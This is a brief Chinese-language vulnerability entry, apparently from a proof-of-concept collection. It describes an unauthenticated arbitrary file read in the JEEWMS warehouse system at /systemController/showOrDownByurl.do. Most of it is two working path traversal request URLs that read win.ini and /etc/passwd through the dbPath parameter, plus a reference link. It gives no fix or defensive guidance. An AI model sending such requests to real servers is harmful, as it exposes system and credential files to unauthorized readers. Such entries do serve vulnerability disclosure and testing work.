# JEEWMS 未授权任意文件读取漏洞

厦门市灵鹿谷科技有限公司 JEEWMS /systemController/showOrDownByurl.do文件 存在未授权任意文件读取漏洞,攻击者可利用该漏洞获取服务器文件,导致大量敏感信息泄露.


```
http://target/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini
http://target/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
```

ref:

https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4033